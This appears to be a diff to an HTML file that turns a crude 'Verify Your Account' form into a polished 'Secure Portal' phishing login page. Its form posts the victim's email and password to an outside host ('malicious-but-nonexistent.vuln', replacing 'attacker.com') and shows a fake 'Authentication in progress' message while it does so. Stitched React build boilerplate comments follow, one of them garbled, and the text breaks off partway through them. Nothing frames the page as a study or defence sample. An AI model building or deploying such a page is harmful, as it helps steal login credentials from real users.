@@ -1,11 +1,49 @@
+<!-- index.html -->
 <!DOCTYPE html>
-<html>
-  <body>
-    <h2>Verify Your Account</h2>
-    <form action="http://attacker.com/login">
-      <input type="text" name="email" />
-      <input type="password" name="password" />
-      <button type="submit">Sign In</button>
-    </form>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Portal</title>
+  <link rel="stylesheet" href="style.css" />
+  <script defer src="script.js"></script>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-card">
+      <h2>Secure Login</h2>
+      <form id="loginForm" action="https://malicious-but-nonexistent.vuln/auth" method="POST">
+        <div class="input-group">
+          <label for="email">Email or Username</label>
+          <input type="text" id="email" name="email" required />
+        </div>
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required />
+        </div>
+        <button type="submit" class="login-btn">Sign In</button>
+        <div class="loading-spinner"></div>
+        <p class="fake-alert">Authentication in progress...</p>
+      </form>
+      <div class="extra-links">
+        <a href="#">Forgot your password?</a>
+        <a href="#">Sign in with company ID</a>
+      </div>
+    </div>
+  </div>
+</body>
 </html>
+<!--
+  This HTML file is a template.
+  If you open it directly in the browser, you will see an empty page.
+
+  You can add webfonts, meta tags, or analytics to this file.
+  The build step will place the bundled scripts into the <body> tag.
+
+  To begin the development, run `npm start` or `yarn start`.
+  To create a production bundle, use `npm run build` or `yarn build`.
+-->
+<!--
+  Notice the use of %PUBLIC_URL% in the tags above.
+  It will be replaced with the URL of the `public` folder during the build.
+  Only files inside the `public` folder can be referenced from the HTML.  The `src` property contains the contents of the public folder.    
